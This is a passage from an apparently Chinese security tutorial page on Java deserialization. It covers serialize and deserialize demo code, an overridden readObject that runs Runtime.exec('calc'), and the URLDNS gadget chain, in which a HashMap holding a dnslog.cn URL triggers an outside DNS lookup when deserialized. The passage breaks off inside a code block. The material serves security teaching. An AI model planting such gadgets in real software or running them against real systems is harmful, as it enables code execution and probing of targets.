</span></span></span><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.seriatestdemo</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileNotFoundException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SerializableDemo</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//创建一个对象，引用UserDemo</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UserDemo</span><span class="w"> </span><span class="n">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UserDemo</span><span class="p">(</span><span class="s">&#34;xiaodisec&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;man1&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">118</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//System.out.println(u);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//调用方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SerializableTest</span><span class="p">(</span><span class="n">u</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">SerializableTest</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//FileOutputStream()输出文件</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//将对象obj序列化后输出到文件ser.txt</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ser.txt 就是对象 u 序列化的数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.txt&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859659.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859696.png" style="max-width: 100%; height: auto;"></p>
<div class="code-block-container" id="code-1769750397365979800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397365979800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397365979800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397365979800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397365979800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//UnserializableDemo.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.seriatestdemo</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Files</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Paths</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">UnserializableDemo</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//调用下面方法，传输ser.txt 解析还原反序列化</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="n">unserializableTest</span><span class="p">(</span><span class="s">&#34;ser.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">unserializableTest</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">filename</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//读取Filename文件进行反序列化还原</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">Files</span><span class="p">.</span><span class="na">newInputStream</span><span class="p">(</span><span class="n">Paths</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">filename</span><span class="p">)));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901944.png" style="max-width: 100%; height: auto;"></p>
<h2 id="安全问题-反序列化利用链">安全问题-反序列化利用链<a hidden class="anchor" aria-hidden="true" href="#安全问题-反序列化利用链">#</a></h2>
<ul>
<li>入口类的<code>readObject</code>直接调用危险方法（实际很少用）
<ul>
<li><code>readObject()</code>路径：C:\Users\SZZY.jdks\corretto-1.8.0_452\src.zip!\java\io\ObjectInputStream.java</li>
</ul>
</li>
</ul>
<div class="code-block-container" id="code-1769750397372076800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397372076800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397372076800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397372076800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397372076800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">readObject</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">readObject</span><span class="p">(</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397373130100" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397373130100">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397373130100" title="Toggle" aria-expanded="false" aria-controls="code-1769750397373130100" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397373130100-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span><span class="lnt" id="7"><span class="lnlinks">7</span>
</span><span class="lnt" id="8"><span class="lnlinks">8</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">反序列化链
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">此处在 UserDemo.java 重写readObject方法，执行了计算机
</span></span><span class="line"><span class="cl">private void readObject(ObjectInputStream ois) throws IOException {
</span></span><span class="line"><span class="cl">        // 指向正确defaultReadObject
</span></span><span class="line"><span class="cl">        // ois.defaultReadObject();
</span></span><span class="line"><span class="cl">        Runtime.getRuntime().exec(&#34;calc&#34;);
</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902412.png" style="max-width: 100%; height: auto;"></p>
<ul>
<li>入口参数中包含可控类，该类有危险方法，readObject时调用
<ul>
<li><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></li>
</ul>
</li>
</ul>
<div class="code-block-container" id="code-1769750397373130100" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397373130100">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397373130100" title="Toggle" aria-expanded="false" aria-controls="code-1769750397373130100" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397373130100-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.seriatestdemo</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.InetAddress</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.MalformedURLException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Files</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Paths</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">UrlDns</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Serializable</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">URL</span><span class="p">,</span><span class="w"> </span><span class="n">Integer</span><span class="o">&gt;</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">URL</span><span class="w"> </span><span class="n">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="s">&#34;http://pz22ed.dnslog.cn&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hash</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">u</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SerializableTest</span><span class="p">(</span><span class="n">hash</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unserializableTest</span><span class="p">(</span><span class="s">&#34;dns.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 序列化</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">SerializableTest</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;dns.txt&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 反序列化</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">unserializableTest</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">filename</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">o</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>执行后有dns访问记录序列化对象hash 来源于自带类HashMap</p>
<p>创建对象HashMap，用到原生态 readObject 方法反序列化数据readObject 本来在 ObjectInputStream 里面但是HashMap中也有readObject方法反序列化readObject方法调用HashMap中的readObject方法</p>
<div class="code-block-container" id="code-1769750397376455900" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397376455900">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397376455900" title="Toggle" aria-expanded="false" aria-controls="code-1769750397376455900" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397376455900-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">// 执行链：
</span></span><span class="line"><span class="cl">*	Gadget Chain:
</span></span><span class="line"><span class="cl">     *	HashMap.readObject()
</span></span><span class="line"><span class="cl">     *	HashMap.putVal()
</span></span><span class="line"><span class="cl">     *	HashMap.hash()
</span></span><span class="line"><span class="cl">     *	URL.hashCode()</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li>入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用</li>
<li>构造函数/静态代码块等类加载时隐式执行-</li>
</ul>
<div class="code-block-container" id="code-1769750397376455900" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397376455900">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397376455900" title="Toggle" aria-expanded="false" aria-controls="code-1769750397376455900" aria-label="展开或折叠代码块">
